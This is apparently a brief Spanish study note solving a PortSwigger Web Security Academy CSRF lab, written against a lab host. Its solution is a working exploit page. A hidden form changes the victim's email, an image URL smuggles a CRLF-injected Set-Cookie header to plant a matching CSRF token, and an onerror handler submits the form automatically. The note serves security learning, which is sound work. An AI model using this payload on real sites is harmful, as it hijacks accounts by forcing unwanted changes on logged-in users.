## Objetivo:

![[Pasted image 20240519212053.png]]



## Solucion:

![[Pasted image 20240519212329.png]]

![[Pasted image 20240519212631.png]]

```
<body>

<form action="https://0a75002d046737aa8220f60700e0003e.web-security-academy.net/my-account/change-email" method="post">

<input type="hidden" name="email" value="pwned@gmail.com" />

<input type="hidden" name="csrf" value="Z4CqpEdCDhX4n7WoBJJgCaiw9HumyV3e" />

</form>

  

<img src="https://0a75002d046737aa8220f60700e0003e.web-security-academy.net/?search=mibusqueda%0d%0aSet-Cookie:%20csrf=Z4CqpEdCDhX4n7WoBJJgCaiw9HumyV3e;%20SameSite=None" onerror="document.forms[0].submit()"/>

</body>
```
